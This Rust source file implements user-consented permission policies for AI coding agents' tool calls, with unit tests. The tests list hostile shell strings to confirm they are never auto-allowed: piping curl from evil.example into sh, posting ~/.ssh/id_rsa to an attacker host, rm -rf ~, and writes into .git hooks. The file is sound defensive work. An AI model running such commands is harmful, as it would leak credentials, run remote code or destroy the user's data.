//! The user's policies (ADR 0014, `docs/dev/plan-zeca.md` W2): text they wrote, saw as a diff and
//! accepted with a click, that answers a permission card for them. The app hands the core only
//! policies whose consent stands (`vults_store::consents`); revoking one takes it out at once.
//!
//! A policy answers allow, deny or ask, and these never bend:
//! - a destructive action always asks, whatever a line says;
//! - a deny beats an ask, and an ask beats an allow;
//! - an allow needs the classifier to *know* the action (`Confidence::Known`), the whole target
//!   (never a cut one), and a shell command with no metacharacter, quote or glob: a pattern alone
//!   never allows what the shell could read otherwise;
//! - an allow is for Claude Code only, whose cards show the whole call; for other agents a policy
//!   denies or asks;
//! - a deny or an ask holds over every spelling of what it names (the reducer lets a deny beat an
//!   older *Always* rule too);
//! - what the agent can *see* is apart from whether this call passes: an allow reaches only the
//!   folder the session started in (never `/` or home, nothing once the agent left it), a command's
//!   words name nothing outside it, and never a write under `.git` (its hooks and config run code
//!   on a later, allowed `git commit`).
//!
//! Paths are checked as written: a symlink inside the folder that leads outside it is not seen,
//! since the core reads no disk (a repository may bring one in, through an allowed `git pull`).

use serde::Serialize;
use vults_protocol::AgentKind;

use crate::Ask;
use crate::policy::{self, Class, Confidence};

/// What a line answers.
#[derive(Serialize, Clone, Copy, Debug, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum Verb {
    Allow,
    Deny,
    Ask,
}

/// What a line is about.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum What {
    /// Every action of this class.
    Class(ClassName),
    /// A shell command by its words; `rest` lets more words follow (a trailing `*`).
    Command { words: Vec<String>, rest: bool },
    /// A tool by its exact name (`WebFetch`; an MCP tool or a shell only for deny or ask).
    Tool(String),
}

/// The classes a line can name. Destructive is not one: those always ask.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ClassName {
    Read,
    ReadExternal,
    Write,
    External,
}

impl ClassName {
    fn parse(word: &str) -> Option<Self> {
        Some(match word {
            "read" => Self::Read,
            "read-external" => Self::ReadExternal,
            "write" => Self::Write,
            "external" => Self::External,
            _ => return None,
        })
    }

    fn matches(self, class: Class) -> bool {
        matches!(
            (self, class),
            (Self::Read, Class::Read)
                | (Self::ReadExternal, Class::ReadExternal)
                | (Self::Write, Class::Write { destructive: false })
                | (Self::External, Class::External)
        )
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Line {
    pub verb: Verb,
    pub what: What,
}

/// One policy, parsed.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Policy {
    /// The folder it holds in (and below); none holds everywhere.
    pub project: Option<String>,
    /// The agents it answers for; empty is every built-in agent.
    pub agents: Vec<AgentKind>,
    pub lines: Vec<Line>,
    /// The user's home folder when it was read: a session there allows nothing.
    pub home: Option<String>,
}

/// A policy the app checked against its consent: only these reach [`decide`].
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Active {
    /// The consent it rests on (`vults_store::ConsentId`), written beside each answer it gives.
    pub consent: i64,
    pub policy: Policy,
}

/// Why a text is not a policy, by its line (1-based).
#[derive(Serialize, Clone, Copy, Debug, PartialEq, Eq)]
pub struct ParseError {
    pub line: usize,
    pub kind: ErrorKind,
}

#[derive(Serialize, Clone, Copy, Debug, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum ErrorKind {
    /// Not `allow`, `deny`, `ask`, `project` or `agents`.
    UnknownWord,
    /// After the verb: not a class, `command` or `tool`.
    UnknownWhat,
    /// A line about destructive actions: they always ask.
    Destructive,
    /// `command` or `tool` with nothing after it, or `project`/`agents` without a value.
    Missing,
    /// A command pattern with shell metacharacters, quotes or a glob other than a last `*`.
    Metacharacters,
    /// `project` is not an absolute folder (or `~/…`).
    NotAbsolute,
    /// A second `project` or `agents` line.
    Twice,
    /// An agent name Vults does not know.
    UnknownAgent,
    /// No `allow`, `deny` or `ask` line.
    Empty,
    /// `allow tool` for a shell (allowed by its commands) or an MCP tool (never known).
    NeverAllowed,
}

/// What a policy's answer is for one call.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Verdict {
    Allow {
        consent: i64,
    },
    Deny {
        consent: i64,
    },
    /// A card: a human answers.
    Ask,
}

/// Longest policy text read: a policy is a few lines a person wrote.
pub const MAX_TEXT: usize = 16 * 1024;

/// Reads a policy. `home` expands a `project ~/…`.
pub fn parse(text: &str, home: Option<&str>) -> Result<Policy, ParseError> {
    let mut policy = Policy {
        project: None,
        agents: Vec::new(),
        lines: Vec::new(),
        home: home.map(str::to_owned),
    };
    let (mut project_seen, mut agents_seen) = (false, false);
    let mut last = 0;
    for (i, raw) in text.lines().enumerate() {
        let line = i + 1;
        last = line;
        let err = |kind| ParseError { line, kind };
        let raw = raw.trim();
        if raw.is_empty() || raw.starts_with('#') {
            continue;
        }
        let mut words = raw.split_whitespace();
        let first = words.next().unwrap_or_default();
        match first {
            "project" => {
                if project_seen {
                    return Err(err(ErrorKind::Twice));
                }
                project_seen = true;
                let rest: Vec<&str> = words.collect();
                if rest.is_empty() {
                    return Err(err(ErrorKind::Missing));
                }
                policy.project = Some(folder(&rest.join(" "), home).ok_or(err(ErrorKind::NotAbsolute))?);
            }
            "agents" => {
                if agents_seen {
                    return Err(err(ErrorKind::Twice));
                }
                agents_seen = true;
                for name in words {
                    let agent = AgentKind::parse(name).ok_or(err(ErrorKind::UnknownAgent))?;
                    if !policy.agents.contains(&agent) {
                        policy.agents.push(agent);
                    }
                }
                if policy.agents.is_empty() {
                    return Err(err(ErrorKind::Missing));
                }
            }
            "allow" | "deny" | "ask" => {
                let verb = match first {
                    "allow" => Verb::Allow,
                    "deny" => Verb::Deny,
                    _ => Verb::Ask,
                };
                let what = match words.next() {
                    Some("destructive") => return Err(err(ErrorKind::Destructive)),
                    Some("command") => {
                        let mut words: Vec<String> = words.map(str::to_owned).collect();
                        let rest = words.last().is_some_and(|w| w == "*");
                        if rest {
                            words.pop();
                        }
                        if words.is_empty() {
                            return Err(err(ErrorKind::Missing));
                        }
                        if words.iter().any(|w| w.contains(META)) {
                            return Err(err(ErrorKind::Metacharacters));
                        }
                        What::Command { words, rest }
                    }
                    Some("tool") => match (words.next(), words.next()) {
                        // A shell is allowed by its commands, never whole; an MCP tool is only
                        // guessed, so an allow could never take effect.
                        (Some(tool), None)
                            if verb == Verb::Allow
                                && (policy::is_shell(tool) || tool.starts_with("mcp__")) =>
                        {
                            return Err(err(ErrorKind::NeverAllowed));
                        }
                        (Some(tool), None) => What::Tool(tool.to_owned()),
                        _ => return Err(err(ErrorKind::Missing)),
                    },
                    Some(class) => match (ClassName::parse(class), words.next()) {
                        (Some(class), None) => What::Class(class),
                        _ => return Err(err(ErrorKind::UnknownWhat)),
                    },
                    None => return Err(err(ErrorKind::Missing)),
                };
                policy.lines.push(Line { verb, what });
            }
            _ => return Err(err(ErrorKind::UnknownWord)),
        }
    }
    if policy.lines.is_empty() {
        return Err(ParseError {
            line: last.max(1),
            kind: ErrorKind::Empty,
        });
    }
    Ok(policy)
}

/// An absolute folder, `~/…` expanded, without a trailing slash; none for a relative one or one
/// that climbs (`..`).
fn folder(path: &str, home: Option<&str>) -> Option<String> {
    let path = match path.strip_prefix("~/") {
        Some(rest) => format!("{}/{rest}", home?.trim_end_matches('/')),
        None if path == "~" => home?.to_owned(),
        None => path.to_owned(),
    };
    if !path.starts_with('/') || path.split('/').any(|c| c == "..") {
        return None;
    }
    let trimmed = path.trim_end_matches('/');
    Some(if trimmed.is_empty() {
        "/".into()
    } else {
        trimmed.into()
    })
}

/// What the shell reads as more than words: separators, redirections, expansions, quotes, globs,
/// escapes and comments. A command with any of these is never allowed by a pattern.
const META: &[char] = &[
    ';', '&', '|', '<', '>', '$', '`', '(', ')', '{', '}', '*', '?', '[', ']', '!', '~', '\\', '\'', '"',
    '#', '\n', '\r',
];

/// File tools whose target is a path, by every name the agents use.
const FILE_TOOLS: &[&str] = &[
    "Read",
    "Glob",
    "Grep",
    "LS",
    "NotebookRead",
    "Edit",
    "MultiEdit",
    "Write",
    "NotebookEdit",
    "read_file",
    "list_directory",
    "glob",
    "search_file_content",
    "read_many_files",
    "replace",
    "write_file",
];

/// Claude Code's searches, which search the session's folder when they name no path. Other
/// agents' searches may name their folder in a field the card does not show, so they never pass
/// without a path.
const SEARCH_HERE: &[&str] = &["Glob", "Grep"];

/// What the user asks of a call, from every policy that holds for it. Read by [`decide`] and by
/// the reducer, which lets a deny beat even an *Always* rule.
pub fn decide(policies: &[Active], call: &Call) -> Verdict {
    // Denies and asks hold wherever the session is; an allow needs the folder it started in.
    let root = call
        .root
        .filter(|r| r.starts_with('/'))
        .map(|r| r.trim_end_matches('/'));
    let Some(scope) = root.or(call
        .cwd
        .filter(|c| c.starts_with('/'))
        .map(|c| c.trim_end_matches('/')))
    else {
        return Verdict::Ask;
    };
    let mine: Vec<&Active> = policies
        .iter()
        .filter(|a| a.policy.agents.is_empty() || a.policy.agents.contains(&call.agent))
        .filter(|a| a.policy.project.as_deref().is_none_or(|p| inside(scope, p)))
        .collect();
    if mine.is_empty() || call.agent == AgentKind::Other {
        return Verdict::Ask;
    }
    // Classed on the whole call, never the cut text the card shows.
    let whole = match &call.ask.full {
        Some(full) => format!("{} · {full}", call.tool),
        None => call.target.to_owned(),
    };
    let classified = policy::classify(call.tool, &whole);
    if classified.class == (Class::Write { destructive: true }) {
        return Verdict::Ask;
    }
    let raw = policy::is_shell(call.tool).then(|| policy::command_of(&whole));
    let command = raw.map(str::trim);
    let lines = |verb: Verb| {
        mine.iter().flat_map(move |a| {
            a.policy
                .lines
                .iter()
                .filter(move |l| l.verb == verb)
                .map(move |l| (a.consent, l))
        })
    };
    let deny_or_ask =
        |verb: Verb| lines(verb).find(|(_, l)| matches(&l.what, call.tool, command, classified.class, verb));
    if let Some((consent, _)) = deny_or_ask(Verb::Deny) {
        return Verdict::Deny { consent };
    }
    if deny_or_ask(Verb::Ask).is_some() {
        return Verdict::Ask;
    }
    // A deny or an ask holds over every spelling of what it names: a command holding its program
    // and subcommand (its first two words), anywhere, is never allowed: `git --no-pager push` and
    // a bare `git push` under `deny command git push origin *`.
    if let Some(command) = command {
        let named: Vec<&str> = command.split_whitespace().collect();
        let watched = lines(Verb::Deny)
            .chain(lines(Verb::Ask))
            .any(|(_, l)| match &l.what {
                What::Command { words, .. } => words.iter().take(2).all(|w| named.contains(&w.as_str())),
                _ => false,
            });
        if watched {
            return Verdict::Ask;
        }
    }
    let homes: Vec<&str> = mine.iter().filter_map(|a| a.policy.home.as_deref()).collect();
    // Only Claude Code's cards show the whole call: the other agents' shells carry a working folder
    // the card leaves out, and their searches may name their folder in a field it doesn't show.
    // For them a policy denies or asks, never allows.
    let Some(root) = root else {
        return Verdict::Ask;
    };
    let may_allow = call.agent == AgentKind::Claude
        && !call.ask.cut
        && call.ask.full.is_none()
        && classified.confidence == Confidence::Known
        // A session started in `/` or the home folder has no folder worth the name.
        && root != "/"
        && !root.is_empty()
        && !homes.iter().any(|h| h.trim_end_matches('/') == root)
        && call.cwd.is_some_and(|c| inside(c.trim_end_matches('/'), root))
        && match command {
            // Plain spaces only: a tab, a carriage return or a wide space reads otherwise.
            Some(c) => {
                !c.is_empty()
                    && !runs_hooks(c)
                    && !c.contains(META)
                    && !raw.unwrap_or_default().chars().any(|ch| ch.is_whitespace() && ch != ' ')
                    && c.split_whitespace().all(plain_word)
            }
            None => in_reach(call, root, classified.class),
        };
    if !may_allow {
        return Verdict::Ask;
    }
    match lines(Verb::Allow)
        .find(|(_, l)| matches(&l.what, call.tool, command, classified.class, Verb::Allow))
    {
        Some((consent, _)) => Verdict::Allow { consent },
        None => Verdict::Ask,
    }
}

/// One card, as [`decide`] reads it.
#[derive(Debug)]
pub struct Call<'a> {
    pub agent: AgentKind,
    /// The folder the session first showed up in: what policies hold in, and what an allow reaches.
    pub root: Option<&'a str>,
    /// Where the agent is now; an allow needs it inside `root`, and relative paths start there.
    pub cwd: Option<&'a str>,
    pub tool: &'a str,
    /// The card's target (`Tool · value`).
    pub target: &'a str,
    pub ask: &'a Ask,
}

fn matches(what: &What, tool: &str, command: Option<&str>, class: Class, verb: Verb) -> bool {
    match what {
        What::Class(name) => name.matches(class),
        // A shell named in a deny or an ask stands for every agent's shell.
        What::Tool(name) => name == tool || (policy::is_shell(name) && policy::is_shell(tool)),
        What::Command { words, rest } => {
            let Some(command) = command else {
                return false;
            };
            // A deny or an ask covers what follows its words, `*` or not: `deny command git push`
            // denies `git push origin main` too.
            let more = *rest || verb != Verb::Allow;
            let fits = |piece: &str| {
                let got: Vec<&str> = piece.split_whitespace().collect();
                got.len() >= words.len()
                    && (more || got.len() == words.len())
                    && got.iter().zip(words).all(|(g, w)| g == w)
            };
            if verb == Verb::Allow {
                fits(command)
            } else {
                // A deny or an ask looks at every piece the shell would run, so `x && git push`
                // still meets `deny command git push *`. Other spellings of the program ask
                // (see `decide`), and an allow never matches a command with a separator.
                command
                    .split([';', '&', '|', '\n', '(', ')', '`'])
                    .any(|p| fits(p.trim()))
            }
        }
    }
}

/// Whether a file call stays in reach: one plain path inside the session's folder, never a write
/// under `.git`; a Claude Code search without a path searches the folder itself. Anything else (a
/// web tool) names no path on this machine.
fn in_reach(call: &Call, root: &str, class: Class) -> bool {
    if !FILE_TOOLS.contains(&call.tool) {
        return true;
    }
    let value = call
        .target
        .split_once(" · ")
        .map(|(_, v)| v.trim())
        .filter(|v| !v.is_empty());
    let Some(path) = value else {
        return SEARCH_HERE.contains(&call.tool);
    };
    // One path, as written: several joined (`a b`, `a, b`), braces, a home or a variable ask.
    if path.contains(|c: char| c.is_whitespace() || matches!(c, ',' | '{' | '}' | '~' | '$' | '`' | '\\')) {
        return false;
    }
    let base = call.cwd.unwrap_or(root).trim_end_matches('/');
    let path = if path.starts_with('/') {
        path.to_owned()
    } else {
        format!("{base}/{path}")
    };
    let climbs = path.split('/').any(|c| c == "..");
    let in_git = path.split('/').any(|c| c.eq_ignore_ascii_case(".git"));
    !climbs && inside(&path, root) && !(in_git && matches!(class, Class::Write { .. }))
}

/// A word an allowed command may carry: letters, digits and `._+=,-`, and `/` only in a plain
/// relative path (one that starts with neither `-` nor `.` and never climbs or enters `.git`). So
/// no absolute path, no option glued to a path (`-F/etc/hosts`, `--output=/x`), no `@file`, no URL
/// (`file:///…`, `https://…`): whatever the program, an allowed command touches only what its words
/// name inside the folder.
fn plain_word(word: &str) -> bool {
    let safe = |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '=' | ',' | '-' | '/');
    if !word.chars().all(safe) {
        return false;
    }
    // An option's value is a path too, glued (`-D.git`) or after `=` (`--dir=..`).
    let glued = word
        .strip_prefix('-')
        .filter(|w| !w.starts_with('-'))
        .map(|w| w.get(1..).unwrap_or(""));
    let parts = word.split(['/', '=', ',']).chain(glued);
    if parts
        .into_iter()
        .any(|p| p == ".." || p.eq_ignore_ascii_case(".git"))
    {
        return false;
    }
    if !word.contains('/') {
        return true;
    }
    !word.starts_with(['-', '.', '/'])
        && !word.contains('=')
        && word
            .split('/')
            .all(|c| !c.is_empty() && c != ".." && c != "." && !c.eq_ignore_ascii_case(".git"))
}

/// Git subcommands that run the repository's hooks (`pre-commit`, `post-checkout`, `pre-push`…),
/// which may live in the worktree (`core.hooksPath=.husky`), so an allowed write could change them:
/// they run the project's code, like a build, and a policy never allows them.
const GIT_HOOKED: &[&str] = &[
    "commit",
    "merge",
    "rebase",
    "pull",
    "push",
    "checkout",
    "switch",
    "cherry-pick",
    "revert",
    "am",
    "worktree",
    "clone",
];

fn runs_hooks(command: &str) -> bool {
    let mut words = command.split_whitespace();
    words.next() == Some("git") && words.any(|w| GIT_HOOKED.contains(&w))
}

/// `path` is `dir` or below it.
fn inside(path: &str, dir: &str) -> bool {
    let dir = dir.trim_end_matches('/');
    dir.is_empty() || path == dir || path.strip_prefix(dir).is_some_and(|r| r.starts_with('/'))
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOME: &str = "/home/u";
    const SITE: &str = "/home/u/site";

    fn active(text: &str) -> Vec<Active> {
        vec![Active {
            consent: 7,
            policy: parse(text, Some(HOME)).unwrap_or_else(|e| panic!("{e:?}")),
        }]
    }

    fn whole() -> Ask {
        Ask {
            description: None,
            full: None,
            cut: false,
            added: 0,
            removed: 0,
        }
    }

    fn call<'a>(tool: &'a str, target: &'a str, ask: &'a Ask) -> Call<'a> {
        Call {
            agent: AgentKind::Claude,
            root: Some(SITE),
            cwd: Some(SITE),
            tool,
            target,
            ask,
        }
    }

    fn at(p: &[Active], tool: &str, value: &str) -> Verdict {
        let target = format!("{tool} · {value}");
        decide(p, &call(tool, &target, &whole()))
    }

    const ALLOW: Verdict = Verdict::Allow { consent: 7 };
    const DENY: Verdict = Verdict::Deny { consent: 7 };
    const ASK: Verdict = Verdict::Ask;

    #[test]
    fn it_reads_what_a_person_writes() {
        let p = parse(
            "# mine\nproject ~/site\nagents claude codex\nallow read\nallow command cargo test *\ndeny tool WebFetch\nask tool mcp__x__y\n",
            Some(HOME),
        )
        .unwrap_or_else(|e| panic!("{e:?}"));
        assert_eq!(p.project.as_deref(), Some(SITE));
        assert_eq!(p.agents, [AgentKind::Claude, AgentKind::Codex]);
        assert_eq!(p.lines.len(), 4);
        assert_eq!(
            p.lines[1].what,
            What::Command {
                words: vec!["cargo".into(), "test".into()],
                rest: true
            }
        );
        let e = |t: &str| parse(t, Some(HOME)).err().map(|e| (e.line, e.kind));
        assert_eq!(e("allow destructive"), Some((1, ErrorKind::Destructive)));
        assert_eq!(e("allow\n"), Some((1, ErrorKind::Missing)));
        assert_eq!(e("allow everything"), Some((1, ErrorKind::UnknownWhat)));
        assert_eq!(
            e("allow spend"),
            Some((1, ErrorKind::UnknownWhat)),
            "nothing is classed a spend"
        );
        assert_eq!(e("please allow read"), Some((1, ErrorKind::UnknownWord)));
        assert_eq!(
            e("allow command cargo test; rm -rf ."),
            Some((1, ErrorKind::Metacharacters))
        );
        assert_eq!(e("allow command ls *.rs"), Some((1, ErrorKind::Metacharacters)));
        assert_eq!(e("allow tool Bash"), Some((1, ErrorKind::NeverAllowed)));
        assert_eq!(
            e("allow tool mcp__github__get_issue"),
            Some((1, ErrorKind::NeverAllowed))
        );
        assert_eq!(e("project site\nallow read"), Some((1, ErrorKind::NotAbsolute)));
        assert_eq!(
            e("project /a/../b\nallow read"),
            Some((1, ErrorKind::NotAbsolute))
        );
        assert_eq!(
            e("project /a\nproject /b\nallow read"),
            Some((2, ErrorKind::Twice))
        );
        assert_eq!(
            e("agents claude robot\nallow read"),
            Some((1, ErrorKind::UnknownAgent))
        );
        assert_eq!(e("agents other\nallow read"), Some((1, ErrorKind::UnknownAgent)));
        assert_eq!(e("# nothing\nproject /a"), Some((2, ErrorKind::Empty)));
    }

    #[test]
    fn a_policy_answers_only_what_it_knows_inside_its_folder() {
        let p = active("allow read\nallow write\nallow command git diff *\nallow tool WebFetch");
        assert_eq!(at(&p, "Read", "/home/u/site/src/main.rs"), ALLOW);
        assert_eq!(at(&p, "Read", "src/main.rs"), ALLOW, "relative to the folder");
        assert_eq!(at(&p, "Edit", "/home/u/site/src/main.rs"), ALLOW);
        assert_eq!(
            decide(&p, &call("Grep", "Grep", &whole())),
            ALLOW,
            "a search without a path searches the folder"
        );
        assert_eq!(
            decide(&p, &call("glob", "glob", &whole())),
            ASK,
            "another agent's search may name its folder elsewhere"
        );
        assert_eq!(
            decide(&p, &call("list_directory", "list_directory", &whole())),
            ASK
        );
        assert_eq!(at(&p, "Bash", "git diff"), ALLOW);
        assert_eq!(at(&p, "Bash", "git diff src/main.rs"), ALLOW);
        assert_eq!(at(&p, "WebFetch", "https://example.com"), ALLOW);
        // What it can see: nothing outside the folder, nothing that climbs, no write in .git.
        for (tool, value) in [
            ("Read", "/home/u/.ssh/id_ed25519"),
            ("Read", "/home/u/site-old/x"),
            ("Read", "../secrets"),
            ("Write", "/home/u/site/.git/hooks/pre-commit"),
            ("Write", "/home/u/site/.GIT/hooks/pre-commit"),
            ("Edit", "src/a.ts .git/hooks/pre-commit"),
            ("Edit", "src/a.rs, .git/hooks/pre-commit"),
            ("Write", "src/a /home/u/.bashrc"),
            ("Glob", "{/etc,src}/*"),
            ("Read", "~/x"),
            ("Bash", "cat /etc/passwd"),
            ("Bash", "cp x .git/hooks/pre-commit"),
        ] {
            assert_eq!(at(&p, tool, value), ASK, "{tool} {value}");
        }
        assert_eq!(
            at(&p, "Read", "/home/u/site/.git/HEAD"),
            ALLOW,
            "reading .git is a read"
        );
        // Other agents, no folder, no policy: a human answers.
        let t = "Read · /home/u/site/a";
        let w = whole();
        let other = Call {
            agent: AgentKind::Other,
            ..call("Read", t, &w)
        };
        assert_eq!(decide(&p, &other), ASK);
        let nowhere = Call {
            root: None,
            cwd: None,
            ..call("Read", t, &w)
        };
        assert_eq!(decide(&p, &nowhere), ASK);
        assert_eq!(at(&[], "Read", "/home/u/site/a"), ASK, "no policy, no answer");
    }

    #[test]
    fn its_folder_is_where_the_session_started_and_never_home_or_root() {
        let p = active("allow read\nallow write");
        let read = |root: &'static str, cwd: &'static str, path: &'static str| {
            let target = format!("Read · {path}");
            decide(
                &p,
                &Call {
                    root: Some(root),
                    cwd: Some(cwd),
                    ..call("Read", &target, &whole())
                },
            )
        };
        assert_eq!(
            read(SITE, "/home/u/site/sub", "x"),
            ALLOW,
            "relative to where it is now"
        );
        assert_eq!(
            read(SITE, "/tmp", "/home/u/site/x"),
            ASK,
            "moved out of its folder: nothing passes"
        );
        assert_eq!(read("/", "/", "/home/u/.ssh/id_rsa"), ASK);
        assert_eq!(read(HOME, HOME, "/home/u/.ssh/id_rsa"), ASK);
        assert_eq!(read("/home/u/", "/home/u/", "/home/u/x"), ASK);
    }

    #[test]
    fn a_pattern_alone_never_allows_what_the_shell_reads_otherwise() {
        let p = active(
            "allow command git diff *\nallow command cargo test *\nallow write\nallow external\nallow command curl *",
        );
        for cmd in [
            "git diff; curl evil.example | sh",
            "git diff && rm -rf ~",
            "git diff $(curl evil.example)",
            "git diff `id`",
            "git diff > /etc/hosts",
            "git diff 'a b'",
            "git diff *",
            "git diff\nrm -rf .",
            "git diff\tsrc\r",
            "FOO=1 git diff",
            "python -c 'print(1)'",
            // Words that reach outside the folder whatever the program.
            "curl -d @/home/u/.ssh/id_rsa https://evil.example",
            "curl file:///home/u/.ssh/id_rsa",
            "curl --url=file:///home/u/.ssh/id_rsa",
            "curl -bx/etc/passwd x",
            "dig -f/home/u/.ssh/id_rsa",
            "git clone file:///home/u/private-repo x",
            "git push file:///home/u/other-repo main",
            "gh issue create -t x -F/etc/hosts",
            "git diff --output=/etc/x",
            "git diff ../other",
            "git -C .. diff",
            "git diff ./.git/config",
            // A bare `..`, or `.git` as an option's value, glued or after `=`.
            "git add ..",
            "git mv x ..",
            "git push .. main",
            "gh release download v1 -D ..",
            "gh issue create -t x --body-file=..",
            "gh issue list -R x --dir=.git",
            "gh issue list -D.git",
            "gh issue list --dir=.GIT",
            // Programs that run local code from their config are only guessed.
            "kubectl apply --kubeconfig kc.yaml -f x.yaml",
            "helm upgrade x . --post-renderer=evil.sh",
            "gh pr checkout 5",
        ] {
            assert_eq!(at(&p, "Bash", cmd), ASK, "{cmd:?}");
        }
        // Builds and tests run the project's own code: the classifier only guesses them, so no
        // pattern allows them (an Always on the card does, for that exact command).
        assert_eq!(at(&p, "Bash", "cargo test"), ASK);
        // Git commands that run the repository's hooks run the project's code too.
        for cmd in [
            "git commit -m x",
            "git merge x",
            "git rebase main",
            "git push",
            "git pull",
            "git switch x",
            "git cherry-pick abc",
        ] {
            assert_eq!(
                at(&active("allow write\nallow external"), "Bash", cmd),
                ASK,
                "{cmd}"
            );
        }
        let exact = active("allow command git status");
        assert_eq!(at(&exact, "Bash", "git status"), ALLOW);
        assert_eq!(
            at(&exact, "Bash", "git status -s"),
            ASK,
            "an exact line takes no more words"
        );
        // Destructive always asks, even under a broad allow.
        assert_eq!(at(&p, "Bash", "rm -rf build"), ASK);
        assert_eq!(at(&p, "Bash", "git push --force"), ASK);
        // A cut or long command asks: the policy would judge less than what runs.
        let t = "Bash · git diff";
        let cut = Ask { cut: true, ..whole() };
        assert_eq!(decide(&p, &call("Bash", t, &cut)), ASK);
        let long = Ask {
            full: Some(format!("git diff {}", "x".repeat(400))),
            ..whole()
        };
        assert_eq!(decide(&p, &call("Bash", t, &long)), ASK);
        // Guessed classes (an MCP tool, an unknown tool, a patch) never pass on a class line.
        assert_eq!(at(&p, "mcp__github__create_issue", "x"), ASK);
        assert_eq!(at(&p, "SomeNewTool", "x"), ASK);
        assert_eq!(at(&p, "apply_patch", "src/a.rs"), ASK);
    }

    #[test]
    fn a_deny_beats_an_ask_and_an_ask_beats_an_allow() {
        let p = active("allow read\nallow command git push *\ndeny command git push *\nask tool Grep");
        assert_eq!(at(&p, "Bash", "git push origin main"), DENY);
        assert_eq!(
            at(&p, "Bash", "git status && git push"),
            DENY,
            "a deny sees each piece"
        );
        assert_eq!(at(&p, "Grep", "/home/u/site"), ASK);
        // Another spelling of the program a deny is about is never allowed by a broad line.
        let broad = active("allow external\ndeny command git push *");
        assert_eq!(at(&broad, "Bash", "git --no-pager push origin main"), ASK);
        let narrow = active("allow external\ndeny command git push origin *");
        assert_eq!(at(&narrow, "Bash", "git push --verbose origin main"), ASK);
        let asked = active("allow external\nask command git push *");
        assert_eq!(at(&asked, "Bash", "git --no-pager push"), ASK);
        // Leaving out or respelling an argument doesn't dodge it: its program and subcommand ask.
        let origin = active("allow external\ndeny command git push origin main");
        for cmd in [
            "git push",
            "git push -u",
            "git push origin",
            "git push origin refs/heads/main",
        ] {
            assert_eq!(at(&origin, "Bash", cmd), ASK, "{cmd}");
        }
        assert_eq!(
            at(&origin, "Bash", "git push origin main --verbose"),
            DENY,
            "a deny covers what follows"
        );
        // A shell named in a deny stands for every agent's shell.
        let shells = active("deny tool Bash");
        assert_eq!(at(&shells, "exec_command", "ls"), DENY);
        // Other agents' calls are never allowed: their cards leave out a working folder.
        let t = "Bash · git status";
        let w = whole();
        let codex = Call {
            agent: AgentKind::Codex,
            ..call("Bash", t, &w)
        };
        assert_eq!(decide(&active("allow command git status"), &codex), ASK);
        assert_eq!(
            decide(&active("deny command git status"), &codex),
            DENY,
            "a deny still holds"
        );
        // Without the folder it started in a deny holds, an allow never.
        let late = Call {
            root: None,
            ..call("Bash", t, &w)
        };
        assert_eq!(decide(&active("deny command git status"), &late), DENY);
        assert_eq!(decide(&active("allow command git status"), &late), ASK);
        // Across policies too: one's deny beats another's allow.
        let mut both = active("allow external");
        both.push(Active {
            consent: 9,
            policy: parse("deny external", None).unwrap_or_else(|e| panic!("{e:?}")),
        });
        assert_eq!(at(&both, "Bash", "git push"), Verdict::Deny { consent: 9 });
        // A destructive action asks even when a deny matches it.
        let d = active("deny command rm *");
        assert_eq!(at(&d, "Bash", "rm -rf build"), ASK);
        // A deny reads the whole command, not the card's cut start.
        let full = Ask {
            full: Some("git status && git push origin main".into()),
            cut: true,
            ..whole()
        };
        assert_eq!(
            decide(&p, &call("Bash", "Bash · git status && git…", &full)),
            DENY
        );
    }

    #[test]
    fn a_policy_holds_only_in_its_folder_and_for_its_agents() {
        let p = active("project ~/site\nagents claude\nallow read");
        let read = |agent, root: &'static str| {
            decide(
                &p,
                &Call {
                    agent,
                    root: Some(root),
                    cwd: Some(root),
                    ..call("Read", "Read · /home/u/site/a", &whole())
                },
            )
        };
        assert_eq!(read(AgentKind::Claude, SITE), ALLOW);
        assert_eq!(
            read(AgentKind::Claude, "/home/u/site/sub"),
            ASK,
            "the path is outside sub"
        );
        assert_eq!(read(AgentKind::Codex, SITE), ASK, "not its agent");
        assert_eq!(read(AgentKind::Claude, "/home/u/other"), ASK);
    }
}
